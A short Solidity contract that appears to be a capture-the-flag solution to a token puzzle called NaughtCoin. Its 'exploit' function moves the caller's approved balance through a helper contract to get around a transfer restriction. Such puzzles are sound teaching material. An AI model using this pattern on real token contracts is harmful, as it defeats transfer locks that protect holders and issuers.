// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaughtyWallet {
    function exploit(address target) external {
        uint256 amount = INaughtCoin(target).balanceOf(msg.sender);
        INaughtCoin(target).transferFrom(msg.sender, address(this), amount);
        INaughtCoin(target).approve(msg.sender, amount); //for later:)
    }
}

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}